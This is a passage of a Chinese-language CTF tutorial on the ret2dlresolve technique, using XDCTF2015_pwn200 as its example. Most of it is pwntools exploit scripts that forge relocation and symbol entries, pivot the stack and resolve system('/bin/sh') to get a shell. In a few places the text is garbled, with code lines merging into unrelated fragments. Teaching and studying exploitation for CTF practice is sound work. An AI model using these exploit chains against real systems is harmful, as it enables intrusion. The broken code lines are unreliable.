    payload+=p32(read_plt)+p32(add_esp8_pop_ret)+p32(0)+p32(DT_STRTAB+4)+p32(4)#change to bss
    #第一次读取，将DYNAMIC中记录的DT_STRTAB地址替换道bss段
    payload+=p32(read_plt)+p32(add_esp8_pop_ret)+p32(0)+p32(bss)+p32(len(dynstr))#fake str table
    #第二次读取：将bss段的内容替换为DT_STRTAB原本的字符串表
    payload+=p32(read_plt)+p32(add_esp8_pop_ret)+p32(0)+p32(bss+0x100)+p32(len("/bin/sh"))
    #第三次读取：向bss+0x100处读入“/bin/sh”
    payload+=p32(relro_read)
    #返回地址：强制重定向read函数
    payload+="aaaa"#填充
    payload+=p32(bss+0x100)
    #参数
    payload+="a"*(256-len(payload))#填充
    p.send(payload)
    p.send(p32(bss))
    p.send(dynstr)
    p.send("/bin/sh\x00")
    p.interactive()
###  Partial RELRO
Partial RELRO保护下，DYNAMIC节只有读取的权限了，因此不能像上一个方法那样直接篡改DYNAMIC节
但reloc_offset却是通过栈传递的，如果我们能够用一个很大的数替代它，就能让链接器在寻址时从bss段寻找我们期望的函数
(这往往需要我们能够极大程度地控制栈空间：首先我们需要能够篡改返回地址；还需要伪造reloc_offset参数；然后我们还需要能够调用类似read的函数来伪造空间，这之中还需要有足够的溢出来传参)
例题来源：[XDCTF2015_pwn200](https://buuoj.cn/challenges#xdctf2015_pwn200)  
 **(该链接为BUU靶场题目链接)**
这次，我们的环境与原题一样了
    [*] '/home/toka/timu/bof'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
请注意阅读下述exp的代码与注释:
    #########################PART 1############################
    from pwn import *
    context.log_level="debug"
    import sys
    reload(sys)
    sys.setdefaultencoding('utf8')
    #########################PART 2############################
    p=process("./bof")
    elf=ELF("./bof")
    libc=elf.libc
    p.recvuntil('Welcome to XDCTF2015~!\n')
    offset = 112
    #########################PART 3############################
    read_plt=elf.plt["read"]
    bss=0x0804A028
    pop_ebp_ret=0x0804862b
    leave_ret=0x8048445
    add_esp8_pop_ret=0x0804836a
    stack_size=0x800
    base_stage=stack_size+bss
    #首先，我们通过栈溢出构造一个read函数与栈迁移的ROP链
    #我们将使用read向base_stage处读入数据
    #并让程序在最后ret时返回到base_stage地址处
    payload='a'*offset
    payload+=p32(read_plt)+p32(add_esp8_pop_ret)+p32(0)+p32(base_stage)+p32(200)
    payload+=p32(pop_ebp_ret)+p32(base_stage-4)+p32(leave_ret)#注意：由于leave指令，此处的地址应为base_stage-4
    p.sendline(payload)
    ########################PART 4############################
    plt_relro=0x8048370 
    write_reloc_offset=0x20 
    DT_JMPREL=0x8048324
    write_got=elf.got["write"]
    write_info=0x607
    print ("r_info:"+hex(base_stage+24-DT_JMPREL))
    #接着，我们构造base_stage种的数据
    #我们将relro_offset由0x20该为base_stage+24-DT_JMPREL
    #然后在DT_JMPREL+relro_offset处填入与Elf32_Rel  ; R_386_JMP_SLOT write相同的内容
    #这样，程序将以为我们需要重定向“write”，于是它将重定向函数，并调用write输出“/bin/sh”
    payload=p32(plt_relro)+p32(base_stage+24-DT_JMPREL)
    payload+="aaaa"#该ROP的返回地址
    payload+=p32(1)+p32(base_stage+80)+p32(len("/bin/sh\x00"))#write的参数
    payload+=p32(write_got)+p32(write_info)#此处即为伪造的Elf32_Rel结构体
    payload+='a'*(80-len(payload))
    payload+="/bin/sh\x00" #此处用以验证函数是否正常调用
    payload+='a'*(120-len(payload))
    p.send(payload)
    ######################################################
    p.interactive()
我们发现，即便我们修改relro_offset让程序索引到外部，只要目的地的内容是合法的，链接器就会正常的工作
上述的exp中，write_info=0x607对应了正确的值，链接器能够用write_info>>8来获取合适的索引，那么如果我们将这个值也拓展到bss段，那么DT_SYMTAB的寻址就也会从bss段寻找，因此就能够伪造DT_SYMTAB中的项；再通过DT_SYMTAB中st_name的偏移来让链接器从bss段寻找函数名，那么我们就能够篡改任意函数为我们期望的函数了
那么我们只需要大胆地修改PART 4部分的代码为：
    ########################PART 4############################
    plt_relro=0x8048370
    write_reloc_offset=0x20
    DT_JMPREL=0x8048324
    DT_SYMTAB=0x80481CC
    DT_STRTAB=0x0804826C
    write_got=elf.got["write"]
    write_info=(((((base_stage+88)+(4+8)-DT_SYMTAB))r_info)] & 0x7fff;//ndx为reloc->r_info,其实就是write_info>>8   
          version = &l->l_versions[ndx];//意为：version=&DT_VERSYM[write_info>>8]
    ndx=DT_VERSYM[reloc->r_info]=DT_VERSYM[write_info>>8]=&DT_VERSYM+2*rite_info>>8
我们在实际调试之前，并不清楚在篡改了write_info之后，我们获得的ndx是多少
又因为l_versions数组只有3个元素，因此，一旦ndx的值大于2就可能会导致程序崩溃
    gdb-peda$ print *((struct r_found_version[3] *)0xf7fd03f0)
    $4 = {{
        name = 0x0, 
        hash = 0x0, 
        hidden = 0x0, 
        filename = 0x0
      }, {
        name = 0x0, 
        hash = 0x0, 
        hidden = 0x0, 
        filename = 0x0
      }, {
        name = 0x804829e "GLIBC_2.0", 
        hash = 0xd696910, 
        hidden = 0x0, 
        filename = 0x804824d "libc.so.6"
      }}
但找到一个合适的数并不困难，我们只需要适当的为write_info加上些许偏移，然后在payload中用”\x00”填充即可
最后，我们修改SRT_OFFSET为DT_STRTAB到base_stage+88+4+8+6*4处，并在该处用”system”填充
然后把本该传给write函数的第一个参数改为”/bin/sh”的地址，就能顺利拿到shell
    ########################PART 4############################
    plt_relro=0x8048370
    write_reloc_offset=0x20
    DT_JMPREL=0x8048324
    DT_SYMTAB=0x80481CC
    DT_STRTAB=0x0804826C
    write_got=elf.got["write"]
    write_info=((((base_stage+88+4+8-DT_SYMTAB))l_info[VERSYMIDX (DT_VERSYM)] != NULL)
        {
              const ElfW(Half) *vernum =
                (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
              ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
              version = &l->l_versions[ndx];
          if (version->hash == 0)
            version = NULL;
        }
如果如下判断语句失败，我们就能够成功绕过
          if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
我们知道l_info是link_map结构体的成员，因此我们的就应该需要先获取link_map的地址，然后用类似read之类的方式篡改其中的l->l_info[VERSYMIDX
(DT_VERSYM)]为NULL即可
另外一个需要注意的地方便是，64位程序将通过_dl_runtime_resolve_xsavec函数来完成重定位，汇编指令如下：
       0x7fe74f08c8ff     mov    qword ptr [rsp], rax
       0x7fe74f08c903     mov    qword ptr [rsp + 8], rcx
       0x7fe74f08c908     mov    qword ptr [rsp + 0x10], rdx
     ► 0x7fe74f08c90d     mov    qword ptr [rsp + 0x18], rsi   
       0x7fe74f08c912     mov    qword ptr [rsp + 0x20], rdi
       0x7fe74f08c917     mov    qword ptr [rsp + 0x28], r8
       0x7fe74f08c91c     mov    qword ptr [rsp + 0x30], r9
我们可以注意到，与32位不同，64位的重定向中，会向rsp地址出放入数据，这就有可能导致我们伪造的栈中数据被破坏
因此还需要再增加一些无用的填充字节
但这也正如我们上面讨论的一样，ret2dlresolve的利用似乎要求我们对栈有着极大的控制权时才能成立，但倘若我们能够这样做，那是不是常规的其他做法也一定可行呢？
只是目前笔者遇到的ret2dlresolve利用大多基于No
Relro保护下，其中也有非常多其他可能的利用环境和利用方式(例如无回显函数、可溢出字节极少等)，但这需要具体例子具体分析，往往在某些地方加上限制也对应着在其他地方放开了限制
## 参考文章：
CTF-WIKI：  
fanyeee：  
holing：